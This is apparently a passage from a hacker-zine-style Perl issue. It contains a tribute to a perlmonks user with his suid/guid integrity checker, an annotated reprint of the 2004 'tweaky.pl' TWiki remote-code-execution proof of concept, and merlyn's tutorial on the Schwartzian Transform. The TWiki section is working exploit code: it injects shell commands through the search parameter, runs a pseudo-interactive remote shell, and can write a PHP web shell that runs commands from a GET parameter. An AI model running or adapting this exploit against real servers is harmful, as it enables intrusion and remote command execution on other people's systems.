2001ï¿½..12ï¿½..28	s0ttle	Re: Help with a n Use of uninitialized value in join error message  Re:SoPW
2001ï¿½..11ï¿½..14	s0ttle	Re: pattern match on entire file	Re:SoPW
2001ï¿½..11ï¿½..14	s0ttle	Re: Removing data from a string with Regex	Re:SoPW
2001ï¿½..11ï¿½..11	s0ttle	Re: prompting a user for input	Re:SoPW
2001ï¿½..11ï¿½..09	s0ttle	Re: Comments in my code Re:Med
2001ï¿½..11ï¿½..09	s0ttle	Comments in my code	Med
2001ï¿½..10ï¿½..29	s0ttle	Re: Interpolating $1 within a variable	Re:SoPW
2001ï¿½..10ï¿½..27	s0ttle	Re: Interpolating $1 within a variable	Re:SoPW
2001ï¿½..10ï¿½..27	s0ttle	Interpolating $1 within a variable	SoPW
2001ï¿½..10ï¿½..23	s0ttle	2nd obfu	Obfu
2001ï¿½..10ï¿½..22	s0ttle	Tribute to TMTOWTDI	Med
2001ï¿½..10ï¿½..22	s0ttle	Re: chmod/chflags	Re:SoPW
2001ï¿½..10ï¿½..04	s0ttle	Re: how to read a 2 dim-array	Re:SoPW
2001ï¿½..10ï¿½..02	s0ttle	first obfu	Obfu
2001ï¿½..09ï¿½..19	s0ttle	Re: beginner syntax question	Re:SoPW
2001ï¿½..09ï¿½..19	s0ttle	Re: Connection time out with net::irc	Re:SoPW
2001ï¿½..09ï¿½..17	s0ttle	formatted output of localtime() SoPW
2001ï¿½..09ï¿½..13	s0ttle	Re: Template Toolkit installation problems	Re:SoPW
2001ï¿½..08ï¿½..21	s0ttle	Re: begining of a file	Re:SoPW
2001ï¿½..08ï¿½..04	s0ttle	Re: subs &amp;&amp; typeglobs	Re:SoPW
2001ï¿½..08ï¿½..04	s0ttle	Re: subs &amp;&amp; typeglobs	Re:SoPW
2001ï¿½..08ï¿½..03	s0ttle	Re: subs &amp;&amp; typeglobs	Re:SoPW
2001ï¿½..08ï¿½..03	s0ttle	Re: subs &amp;&amp; typeglobs	Re:SoPW
2001ï¿½..08ï¿½..03	s0ttle	subs &amp;&amp; typeglobs	SoPW
2001ï¿½..08ï¿½..03	s0ttle	Re: Recursion	Re:SoPW
2001ï¿½..06ï¿½..21	s0ttle	for loop	SoPW
2001ï¿½..06ï¿½..20	s0ttle	s0ttle	User

Good memories, eh? Some a little embarrassing, but you were teething.

Here&#39;s some old s0ttle code. Picked because its newer than the rest.

I like how you code. It&#39;s competent, and it is witty. Enthusiastic.

#!/usr/bin/perl -w

 ;#
 ;# fakelabs development
 ;#

# file: chk_suid
# purpose: helps maintain suid/guid integrity
# author: s0ttle@sawbox.net/perl@s0ttle.net
# site: www.sawbox.net/www.s0ttle.net
#
# This program released under the same
# terms as perl itself
#

use strict;
use Digest::MD5;
use IO::File;
use diagnostics;	# remove after release
use Fcntl qw(:flock);
use POSIX qw(strftime);

use constant DEBUG =&gt; 0;

# Global variables :\
my @suids;
my $count;

my $suidslist = (getpwuid($&lt;))[7].&quot;/suidslist&quot;;
my $suidsMD5  = (getpwuid($&lt;))[7].&quot;/suidsMD5&quot;;
my $masterMD5 = (getpwuid($&lt;))[7].&quot;/masterMD5&quot;;

autoflush STDOUT 1;

&amp;splash;
sub splash{

    print &quot;==============================\n&quot;,
	  &quot;	  www.fakelabs.org	 \n&quot;,
	  &quot;==============================\n&quot;,
	  &quot;		     chk_suids.pl\n&quot;,
	  &quot;++++++++++++++----------------\n&quot;;
}

opendir(ROOT,&#39;/&#39;)
    || c_error(&quot;Could not open the root directory!&quot;);

print &quot;[01] Generating system suid/guid list.\n&quot;;
&amp;find_suids(*ROOT,&#39;/&#39;);
sub find_suids{

    local (*P_FH) = shift;
    my $path = shift;
    my $content;

    opendir(P_FH,&quot;$path&quot;)
      || c_error(&quot;Could not open $path&quot;);

    foreach $content (sort(readdir(P_FH))){
       next if $content eq &#39;.&#39; or $content eq &#39;..&#39;;
       next if -l &quot;$path$content&quot;;

       if (-f &quot;$path$content&quot;){
	  push @suids,&quot;$path$content&quot;
	     if (-u &quot;$path$content&quot; ||
		 -g &quot;$path$content&quot;)  &amp;&amp; ++$count;
       }

       elsif (-d &quot;$path$content&quot; &amp;&amp; opendir(N_PATH,&quot;$path$content&quot;)) {
	   find_suids(*N_PATH,&quot;$path$content/&quot;);
       }

       else { next; }
    }
}
print &quot;[02] Found $count total suid/guid files on your system.\n&quot;;

print join &quot;\n&quot;,@suids if DEBUG == 1;

&amp;suids_perm;
sub suids_perm{

    my $wx_count = 0;
    my $ww_count = 0;
    my @wx_suids;
    my @ww_suids;
    my $tempfile = IO::File::new_tmpfile()
		     || c_error(&quot;Could not open temporary file&quot;);

    while(&lt;@suids&gt;){

	chomp;

	my ($user,$group) = (lstat)[4,5];
	my $mode = (lstat)[2] &amp; 07777;

	$tempfile-&gt;printf(&quot;%-4o %-10s %-10s %-40s\n&quot;,
		   $mode,(getpwuid($user))[0],(getgrgid($group))[0],$_);
    }

    $tempfile-&gt;seek(0,0);

    foreach (&lt;$tempfile&gt;){
	  my $perm = (split(/\s+/,$_))[0];
	  if (($perm &amp; 01) == 01){
	    push @wx_suids,$_; ++$wx_count;
	  }
	  elsif (($perm &amp; 02) == 00){
	    push @ww_suids; ++$ww_count;
	  }
    }

    @ww_suids = &#39;none&#39; if !@ww_suids;
    @wx_suids = &#39;none&#39; if !@wx_suids;

    print &quot;[03] World writable suids found: $ww_count\n&quot;;
    print &quot;=&quot; x 50,&quot;\n&quot;, @ww_suids, &quot;=&quot; x 10, &quot;\n&quot;
	if $ww_suids[0] !~/none/;

    print &quot;[04] World executable suids found: $wx_count\n&quot;;
    print &quot;=&quot; x 50, &quot;\n&quot;, @wx_suids, &quot;=&quot; x 50,&quot;\n&quot;
	if $wx_suids[0] !~/none/;

    cfg_check($tempfile);
}

sub cfg_check{

    my $tempfile = shift;
    my $lcount = 0;

print $masterMD5,$suidsMD5,$suidslist,&quot;\n&quot; if DEBUG == 1;

    foreach ($masterMD5,$suidsMD5,$suidslist){
	  ++$lcount if !-e;
    }

    $0 =~s!.*/!!;

print $lcount,&quot;\n&quot; if DEBUG == 1;

    if (($lcount != 0) &amp;&amp; ($lcount &lt; 3)){
     print &quot;[05] Inconsistency found with cfg files, exiting.\n&quot;;
    }

    elsif ($lcount == 3){
	print &quot;[05] It seems this is your first time running $0.\n&quot;;

	&amp;n_create($tempfile);
    }

    elsif ($lcount == 0){
	print &quot;[05] Checking cfg and suid/guid integrity\n&quot;;
	sleep(2);

	&amp;c_suidlist($tempfile); &amp;c_suidsmd5; &amp;c_mastermd5;
    }
}

sub c_suidlist{

    my $tempfile = shift;
    my $slist = IO::File-&gt;new($suidslist, O_RDONLY)
		      || c_error(&quot;Could not open $suidslist for reading&quot;);

    flock($slist,LOCK_SH);

    $tempfile-&gt;seek(0,0);

    my %temp_vals;
    while(&lt;$tempfile&gt;){
	chomp;
	my ($tperm,$towner,$tgroup,$tfile) = split(/\s+/,$_,4);

print join &#39;:&#39;,$tperm,$towner,$tgroup,$tfile,&quot;\n&quot; if DEBUG == 1;

	$temp_vals{$tfile}  = [$tperm,$towner,$tgroup,$tfile];
    }

    my %suid_vals;
    while(&lt;$slist&gt;){
	chomp;
	my ($sperm,$sowner,$sgroup,$sfile) = split(/\s+/,$_,4);

print join &#39;:&#39;,$sperm,$sowner,$sgroup,$sfile,&quot;\n&quot; if DEBUG == 1;

	$suid_vals{$sfile} = [$sperm,$sowner,$sgroup,$sfile];
    }

    $slist-&gt;close;

    my $badsuids = 0;
    foreach my $val (sort keys %suid_vals){
	  if (&quot;@{$suid_vals{$val}}&quot;  ne  &quot;@{$temp_vals{$val}}&quot;){

	    ++$badsuids &amp;&amp;
	    print &quot;[06] !WARNING! suid/guid modification(s) found! \n&quot;,
		  &quot;=&quot; x 50,&quot;\n&quot; unless $badsuids;

	    &amp;suidl_warn(\@{$temp_vals{$val}},\@{$suid_vals{$val}});

	  }
    }

    if (!$badsuids){
      print &quot;[06] $suidslist: OK \n&quot;;
    } else {
	 &amp;f_badsuids;
    }
}

sub c_mastermd5{

    srand;

    my $tmd5f = POSIX::tmpnam();
    my $tsuf = (rand(time ^ $$)) + $&lt;;

    $tmd5f .= $tsuf;

    c_error(&quot;[07] !WARNING! $tmd5f is a symlink, exiting&quot;) if -l $tmd5f;

    my $tempmd5 = IO::File-&gt;new($tmd5f, O_WRONLY|O_CREAT)
		|| c_error(&quot;Could not open $tmd5f for writing&quot;);

    flock($tempmd5,LOCK_EX);

    my $mmd5f = IO::File-&gt;new($masterMD5, O_RDONLY)
		 || c_error(&quot;Could not open $masterMD5 for reading&quot;);

    flock($mmd5f,LOCK_SH); chomp(my $mmd5 = &lt;$mmd5f&gt;); $mmd5f-&gt;close;

    while(&lt;@suids&gt;){

	chomp;

	my ($md5f,$md5v) =  md5($_);

	$tempmd5-&gt;printf(&quot;%-40s: %-40s\n&quot;, $md5f, $md5v)
	       if $md5f &amp;&amp; $md5v;

    }  $tempmd5-&gt;close;

    my $s_md5 = md5($suidsMD5);
    my $t_md5 = md5($tmd5f);

    if ((&quot;$s_md5&quot; eq &quot;$t_md5&quot;) &amp;&amp; (&quot;$t_md5&quot; eq &quot;$mmd5&quot;)){
      print &quot;[08] $masterMD5: OK \n&quot;;

    }
#    my $md5 = md5($suidsMD5); print &quot;MASTER: $m_md5\n&quot;;
#    my $t_md5 = md5($tmd5); print &quot;TEMP: $t_md5\n&quot;;


  print &quot;[09] Verify this is actually your masterMD5 sum: $mmd5\n&quot;;
  sleep(3);

  &amp;cleanup;
  &amp;ret;
}

sub suidl_warn{

    my $tv_ref = shift;
    my $sv_ref = shift;

    printf(&quot;OLD: %-4d %-10s %-10s %-40s\n&quot;,
	   $$tv_ref[0],$$tv_ref[1],$$tv_ref[2],$$tv_ref[3]);

    printf(&quot;NEW: %-4d %-10s %-10s %-40s\n&quot;,
	   $$sv_ref[0],$$sv_ref[1],$$sv_ref[2],$$sv_ref[3]);

}

sub c_suidsmd5{
print &quot;[07] $suidslist: OK \n&quot;;
}

sub cleanup{
print &quot;[10] Cleaning up and exiting \n&quot;;
}

sub ret{
print &quot;+=&quot; x 28,&quot;\n&quot;,&quot;s0ttle: $0 still in beta! :\\ \n&quot;;
}
#
# I was going to add the option to update the cfg files with any new legitimate
# changes, but that would make it too easy for an intruder to circumvent this whole process
# its not too hard to do it manually anyway :\
#
sub f_badsuids{

    print &quot;=&quot; x 50,&quot;\n&quot;,&quot;[07] Pay attention to any unknown changes shown above!\n&quot;;
    sleep(2);

}

sub n_create{

    my $tempfile = shift;

    print &quot;[06] Creating: $suidslist\n&quot;; &amp;slst_create($tempfile);
    print &quot;[07] Creating: $suidsMD5 \n&quot;; &amp;smd5_create;
    print &quot;[08] Creating: $masterMD5\n&quot;; &amp;mmd5_create;
}

sub slst_create{

    my $tempfile = shift;
    my $slist = IO::File-&gt;new($suidslist, O_WRONLY|O_CREAT)
		 || c_error(&quot;Could not open $suidslist for writing&quot;);

    flock($slist,LOCK_EX);

    $tempfile-&gt;seek(0,0);

    while(&lt;$tempfile&gt;){

	$slist-&gt;print(&quot;$_&quot;);
    }

    $tempfile-&gt;close; $slist-&gt;close;
}

sub smd5_create{

    my $smd5 = IO::File-&gt;new($suidsMD5, O_WRONLY|O_CREAT)
		|| c_error(&quot;Could not open $suidsMD5 for writing&quot;);

    flock($smd5,LOCK_EX);

    while(&lt;@suids&gt;){

	chomp;

	my ($md5f,$md5v) =  md5($_);

	$smd5-&gt;printf(&quot;%-40s: %-40s\n&quot;, $md5f, $md5v)
	       if $md5f &amp;&amp; $md5v;

    }

    $smd5-&gt;close;
}

sub mmd5_create{

    my $mmd5v = (md5($suidsMD5))[1];
    my $mmd5 = IO::File-&gt;new($masterMD5, O_WRONLY|O_CREAT)
		|| c_error(&quot;Could not open $masterMD5 for writing&quot;);

    flock($mmd5,LOCK_EX);

    $mmd5-&gt;print(&quot;$mmd5v\n&quot;);
    $mmd5-&gt;close;
}

sub md5{

    my $suid_file = shift;
    my %mdb;

    my $obj = Digest::MD5-&gt;new();

    if ( my $suidf = IO::File-&gt;new($suid_file, O_RDONLY) ){

      flock($suidf,LOCK_SH); binmode($suidf);

      $obj-&gt;addfile($suidf);
      $mdb{$suid_file} = $obj-&gt;hexdigest;
      $obj-&gt;reset();
      $suidf-&gt;close;

      return($suid_file,$mdb{$suid_file});

    } else { warn(&quot;[E] Could not open $suid_file: $!\n&quot;);
    }
}

sub c_error{

    my $error = &quot;@_&quot;;

    print &quot;ERROR: $error: $!\n&quot;;
    exit(0);
}

More than just a coder, you were a rare ambassador of Perl to the underground. You were willing to
weild the power without shame. You were a hacker who could use Perl with pride, and to your
considerable benefit. Either that or a Perl programmer who could hack with pride, to your benefit.
You choose your way of looking at it.

And then it came crashing down. What happened, s0ttle? Why did you leave us? What did you move on
to? A blissful idle existence? Did you get your cred and then get too busy with everything else?

The reason this article is here is because you&#39;ve decided to make an appearance on the Perl scene
again. You&#39;ve reacquired your perlmonk.org account. We can only take this as a sign that you want
to come back. This is both encouraged, and now, expected. Welcome back, s0ttle.

-[0x17] # RoMaNSoFt is TwEaKy --------------------------------------------

#!/usr/bin/perl

# yes! a shebang line!

# &quot;tweaky.pl&quot; v. 1.0 beta 2
#
# Proof of concept for TWiki vulnerability. Remote code execution
# Vuln discovered, researched and exploited by RoMaNSoFt &lt;roman@rs-labs.com&gt;
#
# Madrid, 30.Sep.2004.

# finally someone with a relatively short introduction &quot;block&quot;
# and it is clean and sticks to the point!
# that will save you a lot of hurt, I&#39;ll just tap around the edges

require LWP::UserAgent;
# use it
# rarely is require needed, and this isn&#39;t it
# no, that excuse is wrong
# so is that one
# please don&#39;t defend yourself and waste all of our time
use Getopt::Long;
# but use strict!

### Default config
$host = &#39;&#39;;
# my $host;
$path = &#39;/cgi-bin/twiki/search/Main/&#39;;
$secure = 0;
$get = 0;
$post = 0;
$phpshellpath=&#39;&#39;;
# singleline some of these

$createphpshell = &#39;(echo `perl -e \&#39;print chr(60).chr(63)\&#39;` ;
 echo \&#39;$out = shell_exec($_GET[&quot;cmd&quot;].&quot; 2\&#39;`perl -e \&#39;print chr(62).
chr(38)\&#39;`\&#39;1&quot;);\&#39; ; echo \&#39;echo &quot;\&#39;`perl -e \&#39;print chr(60).&quot;pre&quot;.chr(62).
&quot;\\\\$out&quot;.chr(60).&quot;/pre&quot;.chr(62)\&#39;`\&#39;&quot;;\&#39; ; echo `perl -e \&#39;print chr(63).chr(62)\&#39;`) | tee &#39;;

# christ that is a mess. quotemeta, baby

$logfile = &#39;&#39;;     # If empty, logging will be disabled
$prompt = &quot;tweaky\$ &quot;;
$useragent = &#39;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)&#39;;
$proxy = &#39;&#39;;
$proxy_user = &#39;&#39;;
$proxy_pass = &#39;&#39;;
$basic_auth_user = &#39;&#39;;
$basic_auth_pass = &#39;&#39;;
$timeout = 30;
$debug = 0;

# disgusting waste of lines!
# at this rate they will be an endangered species!

$init_command = &#39;uname -a ; id&#39;;
$start_mark = &#39;AAAA&#39;;
$end_mark = &#39;BBBB&#39;;
$pre_string = &#39;nonexistantttt\&#39; ; (&#39;;
$post_string = &#39;) | sed \&#39;s/\(.*\)/&#39;.$start_mark.&#39;\1&#39;.$end_mark.&#39;.txt/\&#39; ; fgrep -i -l -- \&#39;nonexistantttt&#39;;
$delim_start = &#39;&lt;b&gt;&#39;.$start_mark;
$delim_end = $end_mark.&#39;&lt;/b&gt;&#39;;

print &quot;Proof of concept for TWiki vulnerability. Remote code execution.\n&quot;;
print &quot;(c) RoMaNSoFt, 2004. &lt;roman\@rs-labs.com&gt;\n\n&quot;;
# the cutest thing in your program. 

### User-supplied config (read from the command-line)
$parsing_ok = GetOptions (&#39;host=s&#39; =&gt; \$host,
                          &#39;path=s&#39; =&gt; \$path,
                          &#39;secure&#39; =&gt; \$secure,
                          &#39;get&#39; =&gt; \$get,
                          &#39;post&#39; =&gt; \$post,
                          &#39;phpshellpath=s&#39; =&gt; \$phpshellpath,
                          &#39;logfile=s&#39; =&gt; \$logfile,
                          &#39;init_command=s&#39; =&gt; \$init_command,
                          &#39;useragent=s&#39; =&gt; \$useragent,
                          &#39;proxy=s&#39; =&gt; \$proxy,
                          &#39;proxy_user=s&#39; =&gt; \$proxy_user,
                          &#39;proxy_pass=s&#39; =&gt; \$proxy_pass,
                          &#39;basic_auth_user=s&#39; =&gt; \$basic_auth_user,
                          &#39;basic_auth_pass=s&#39; =&gt; \$basic_auth_pass,
                          &#39;timeout=i&#39; =&gt; \$timeout,
                          &#39;debug&#39; =&gt; \$debug,
                          &#39;start_mark=s&#39; =&gt; \$start_mark,
                          &#39;end_mark=s&#39; =&gt; \$end_mark);

### Some basic checks
&amp;banner unless ($parsing_ok);
# banner() unless $parsing_ok;
# that&#39;s actually nice perl-english
# lwall style

if ($get and $post) {
  print &quot;Choose one only method! (GET or POST)\n\n&quot;;
  &amp;banner;
}

if (!($get or $post)) {
  # If not specified we prefer POST method
  $post = 1;
}

if (!$host) {
  print &quot;You must specify a target hostname! (tip: --host &lt;hostname&gt;)\n\n&quot; ;
  &amp;banner;
# no
}

$url = ($secure ? &#39;https&#39; : &#39;http&#39;) . &quot;://&quot; . $host . $path;

### Checking for a vulnerable TWiki
&amp;run_it ($init_command, &#39;RS-Labs rlz!&#39;);
# no
### Execute selected payload

if ($phpshellpath) {
  &amp;create_phpshell;
# no
  print &quot;PHPShell created.&quot;;
} else {
  &amp;pseudoshell;
# no
}

### End
exit(0);
# no

### Create PHPShell
sub create_phpshell {
  $createphpshell .= $phpshellpath;
# what happened to consistent underscores in variable names?
  &amp;run_it($createphpshell, &#39;yeah!&#39;);
# nah!
}


### Pseudo-shell
sub pseudoshell {
open(LOGFILE, &quot;&gt;&gt;$logfile&quot;) if $logfile;
open(STDINPUT, &#39;-&#39;);
# make sure to test that your file opening didn&#39;t fail!

print &quot;Welcome to RoMaNSoFt&#39;s pseudo-interactive shell :-)\n[Type Ctrl-D or (bye, quit, exit, logout) to exit]\n\n&quot;.$prompt.$init_command.&quot;\n&quot;;
&amp;run_it ($init_command);
print $prompt;

while (&lt;STDINPUT&gt;) {
# STDIN is too cool for you
  chop;
# stick with chomp or be consistent with chop
  if ($_ eq &quot;bye&quot; or $_ eq &quot;quit&quot; or $_ eq &quot;exit&quot; or $_ eq &quot;logout&quot;) {
# time to learn regex? why bother
    exit(1);
  }
  
  &amp;run_it ($_) unless !$_;
#  run_it($_) if $_;
  print &quot;\n&quot;.$prompt;
}

close(STDINPUT);
close(LOGFILE) if $logfile;
}


### Print banner and die
sub banner {
  print &quot;Syntax: ./tweaky.pl --host=&lt;host&gt; [options]\n\n&quot;;
  print &quot;Proxy options:        --proxy=http://proxy:port --proxy_user=foo --proxy_pass=bar\n&quot;;
  print &quot;Basic auth options:   --basic_auth_user=foo --basic_auth_pass=bar\n&quot;;
  print &quot;Secure HTTP (HTTPS):  --secure\n&quot;;
  print &quot;Path to CGI:          --path=$path\n&quot;;
  print &quot;Method:               --get | --post\n&quot;;
  print &quot;Enable logging:       --logfile=/path/to/a/file\n&quot;;
  print &quot;Create PHPShell:      --phpshellpath=/path/to/phpshell\n&quot;;
  
  exit(1);
}


### Execute command via vulnerable CGI
sub run_it {
  my ($command, $testing_vuln) = @_;
  my $req;
  my $ua = new LWP::UserAgent;
  
  $ua-&gt;agent($useragent);
  $ua-&gt;timeout($timeout);
  
	# this code looks regular! you stole it from the docs, didn&#39;t you? 
	# come on, ADMIT IT

  # Build CGI param and urlencode it
  my $search = $pre_string . $command . $post_string;
  $search =~ s/(\W)/&quot;%&quot; . unpack(&quot;H2&quot;, $1)/ge;
  
  # Case GET
  if ($get) {
    $req = HTTP::Request-&gt;new(&#39;GET&#39;, $url . &quot;?scope=text&amp;order=modified&amp;search=$search&quot;);
  }

  # Case POST
  if ($post) {
    $req = new HTTP::Request POST =&gt; $url;
    $req-&gt;content_type(&#39;application/x-www-form-urlencoded&#39;);
    $req-&gt;content(&quot;scope=text&amp;order=modified&amp;search=$search&quot;);
  }

  # Proxy definition
  if ($proxy) {
    if ($secure) {
      # HTTPS request
      $ENV{HTTPS_PROXY} = $proxy;
      $ENV{HTTPS_PROXY_USERNAME} = $proxy_user;
      $ENV{HTTPS_PROXY_PASSWORD} = $proxy_pass;      
    } else {
      # HTTP request
      $ua-&gt;proxy([&#39;http&#39;] =&gt; $proxy);
      $req-&gt;proxy_authorization_basic($proxy_user, $proxy_pass);      
    }
  }

  # Basic Authorization
  $req-&gt;authorization_basic($basic_auth_user, $basic_auth_pass) if ($basic_auth_user);

  # Launch request and parse results
  my $res = $ua-&gt;request($req);

  if ($res-&gt;is_success) {
    # this block is somewhat decent. did someone else code it for you?

    print LOGFILE &quot;\n&quot;.$prompt.$command.&quot;\n&quot; if ($logfile and !$testing_vuln);
    @content = split(&quot;\n&quot;, $res-&gt;content);
    
    my $empty_response = 1;
    
    foreach $_ (@content) {
      my ($match) = ($_ =~ /$delim_start(.*)$delim_end/g);
      # greedy greedy regex

      if ($debug) {
        print $_ . &quot;\n&quot;;
      } else {
      	if ($match) {
      	  $empty_response = 0;
      	  print $match . &quot;\n&quot; unless ($testing_vuln);
      	}
      }
      
      print LOGFILE $match . &quot;\n&quot; if ($match and $logfile and !$testing_vuln);
    }
    
    if ($empty_response) {
      if ($testing_vuln) {
      die &quot;Sorry, exploit didn&#39;t work!\nPerhaps TWiki is patched or 
you supplied a wrong URL (remember it should point to Twiki&#39;s search page).\n&quot;;
      } else {
        print &quot;[Server issued an empty response. Perhaps you entered a wrong command?]\n&quot;;
      }
    }
    
  } else {
    die &quot;Couldn&#39;t connect to server. Error message follows:\n&quot; . $res-&gt;status_line . &quot;\n&quot;;
  } 
}

# romansoft? what happened to ridiculing real security professionals?

-[0x18] # School You: merlyn ---------------------------------------------

[suggested title: ``Sorting with the Schwartzian Transform&#39;&#39;]

It was a rainy April in Oregon over a decade ago when I saw the usenet post made by Hugo Andrade
Cartaxeiro on the now defunct comp.lang.perl newsgroup:

    I have a (big) string like that:

    print $str;
    eir      11   9   2    6	3    1	   1  81%  63%	  13
    oos      10   6   4    3	3    0	   4  60%  70%	  25
    hrh      10   6   4    5	1    2	   2  60%  70%	  15
    spp      10   6   4    3	3    1	   3  60%  60%	  14

    and I like to sort it with the last field as the order key. I know
    perl has some features to do it, but I can&#39;t make &#39;em work properly.

In the middle of the night of that rainy April (well, I can&#39;t remember whether it was rainy, but
that&#39;s a likely bet in Oregon), I replied, rather briefly, with the code snippet:

    $str =
	    join &quot;\n&quot;,
	    map { $_-&gt;[0] }
	    sort { $a-&gt;[1] &lt;=&gt; $b-&gt;[1] }
	    map { [$_, (split)[-1]] }
	    split /\n/,
	    $str;

And even labeled it ``speaking Perl with a Lisp&#39;&#39;. As I posted that snippet, I had no idea that
this particular construct would be named and taught as part of idiomatic Perl, for I had created
the Schwartzian Transform. No, I didn&#39;t name it, but in the followup post from fellow Perl author
and trainer Tom Christiansen, which began:

    Oh for cryin&#39; out loud, Randal!  You expect a NEW PERL PROGRAMMER
    to make heads or tails of THAT? :-) You&#39;re postings JAPHs for
    solutions, which isn&#39;t going to help a lot.  You&#39;ll probably
    manage to scare these poor people away from the language forever? :-)

    BTW, you have a bug.

he eventually went on to describe what my code actually did. Oddly enough, the final lines of that
post end with:

  I&#39;m just submitting a sample chapter for his perusal for inclusion
  the mythical Alpaca Book :-)

It would be another 8 years before I would finally write that book, making it the only O&#39;Reilly
book whose cover animal was known that far in advance.

On the next update to the ``sort&#39;&#39; function description in the manpages, Tom added the snippet:

    # same thing using a Schwartzian Transform (no temps)
    @new = map { $_-&gt;[0] }
	sort { $b-&gt;[1] &lt;=&gt; $a-&gt;[1]
			||
	       $a-&gt;[2] cmp $b-&gt;[2]
	} map { [$_, /=(\d+)/, uc($_)] } @old;

Although the lines of code remain in today&#39;s perlfunc manpage, the phrase now lives only within
perlfaq4. Thus, the phrase became the official description of the technique.

So, what is this transform? How did it solve the original problem? And more importantly, what was
the bug?

Like nearly all Perl syntax, the join, map, sort, and split functions work right-to-left, taking
their arguments on the right of the keyword, and producing a result to the left. This linked
right-to-left strategy creates a little assembly line, pulling apart the string, working on the
parts, and reassembling it to a single string again. Let&#39;s look at each of the steps, pulled apart
separately, and introduce variables to hold the intermediate values.

First, we turn $str into a list of lines (four lines for the original data):

  my @lines = split /\n/, $str;

The split rips the newlines off the end of the string. One of my students named the delimiter
specification as ``the deliminator&#39;&#39; as a way of remembering that, although I think that was by
accident.

Next, we turn the individual lines into an equal number of arrayrefs:

  my @annotated_lines = map { [$_, (split)[-1]] } @lines;

There&#39;s a lot going on here. The map inserts each element of @lines into $_, then evaluates the
expression, which yields a reference to an anonymous array. To make it a bit clearer, let&#39;s write
that as:

  my @annotated_lines = map {
    my @result = ($_, (split)[-1]);
    \@result;
  } @lines;

Well, only a bit clearer. We can see that each result consists of two elements: the original line
(in $_), and the value of that ugly split-inside-a-literal-slice. The split has no arguments, so
we&#39;re splitting $_ on whitespace. The resulting list value is then sliced with an index of -1,
which means ``take the last element, no matter how long the list is&#39;&#39;. So for the first line, we
now have an array containing the original line (without the newline) and the number 13. Thus, we&#39;re
creating @annotated_lines to be roughly:

  my @annotated_lines = (
    [&quot;eir  11	9   2	6   3	1  1  81%  63%	13&quot;, &quot;13&quot;],
    [&quot;oos  10	6   4	3   3	0  4  60%  70%	25&quot;, &quot;25&quot;],
    [&quot;hrh  10	6   4	5   1	2  2  60%  70%	15&quot;, &quot;15&quot;],
    [&quot;spp  10	6   4	3   3	1  3  60%  60%	14&quot;, &quot;14&quot;],
  );

Notice how we can now quickly get at the ``sort key&#39;&#39; for each line. If we look at
$annotated_lines[2][1] (15) and compare it with $annotated_lines[3][1] (14), we see that the third
line would sort after the fourth line in the final output. And that&#39;s the next step in the
transform: we want to shuffle these lines, looking at the second element of each list to decide the
sort order:

  my @sorted_lines = sort { $a-&gt;[1] &lt;=&gt; $b-&gt;[1] } @annotated_lines;

Inside the sort block, $a and $b stand in for two of the elements of the input list. The result of
the sort block determines the before/after ordering of the final list. In our case, $a and $b are
both arrayrefs, so we dereference them looking at the second item of the array (our sort key), and
then compare then numerically (with the spaceship operator), yielding the appropriate -1 or +1
value to put them in ascending numeric order. To get a descending order, I could have swapped the
$a and $b variables.

As an aside, when the keys are equal, the spaceship operator returns a 0 value, meaning ``I don&#39;t
care what the order of these lines in the output might be&#39;&#39;. For many years, Perl&#39;s built-in sort
operator was unstable, meaning that a 0 result here would produce an unpredictable ordering of the
two lines. Recent versions of Perl introduced a stable sort strategy, meaning that the output lines
will be in the same relative ordering as the input for this condition.

We now have the sorted lines, but it&#39;s not exactly palatable for the original request, because our
sorted data is buried within the first element of each sublist of our list. Let&#39;s extract those
back out, with another map:

  my @clean_lines = map { $_-&gt;[0] } @sorted_lines;

And now we have the lines, sorted by last column. Just one last step to do now, because the
original request was to have a single string:

  my $result = join &quot;\n&quot;, @clean_lines;

And this glues the list of lines together, putting newlines between each element. Oops, that&#39;s the
bug. I really wanted:

  $line1 . &quot;\n&quot; . $line2 . &quot;\n&quot; . $line3 . &quot;\n&quot;

when in fact what I got was:

  $line1 . &quot;\n&quot; . $line2 . &quot;\n&quot; . $line3

and it&#39;s missing that final newline. What I should have done perhaps was something like:

  my @clean_lines_with_newlines = map &quot;$_\n&quot;, @clean_lines;
  my $result = join &quot;&quot;, @clean_lines_with_newlines;

Or, since my key-extracting split would have worked even if I had retained the trailing newlines, I
could have generated @lines initially with:

  my @lines = $str =~ /(.*\n)/g;

but that wouldn&#39;t have been as left-to-right. To really get it to be left to right, I&#39;d have to
resort to a look-behind split pattern:

  my @lines = split /(?&lt;=\n)/, $str;

But we&#39;re now getting far enough into the complex code that I&#39;m distracting even myself as I write
this, so let&#39;s get back to the main point.

In the Schwartzian Transform, the keys are extracted into a readily accessible form (in this case,
an additional column), so that the sort block be executed relatively cheaply. Why does that matter?
Well, consider an alternative steps to get from @lines to @clean_lines:

  my @clean_lines = sort {
    my $key_a = (split &#39; &#39;, $a)[-1];
    my $key_b = (split &#39; &#39;, $b)[-1];
    $key_a &lt;=&gt; $key_b;
  } @lines;

Instead of computing each key all at once and caching the result, we&#39;re computing the key as
needed. There&#39;s no difference functionally, but we pay a penalty of execution time.

Consider what happens when sort first needs to know how the line ending in 13 compares with the
line ending in 25. These relatively expensive splits are executed for each line, and we get 13 and
25 in the two local variables, and an appropriate response is returned (the line with 13 sorts
before the line with 25). But when the line ending with 13 is then compared with the line ending
with 15, we need to re-execute the split to get the 13 value again. Oops.

And while it may not make a difference for this small dataset, once we get into the tens or
hundreds or thousands of elements in the list, the cost of recomputing these splits rapidly
dominates the calculations. Hence, we want to do that once and once only.

I hope this helps explain the Schwartzian Transform for you. Until next time, enjoy!

-[0x19] # oh noez spiderz ------------------------------------------------

#!/usr/bin/perl

print q{
_________________________________________________________________________
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;|

	   /	  \
	\  \  ,,  /  /
	 &#39;-.`\()/`.-&#39;
	.--_&#39;(	)&#39;_--.
       / /` /`&quot;&quot;`\ `\ \ 	  * SpiderZ ForumZ Security *
	|  |  &gt;&lt;  |  |
	\  \	  /  /
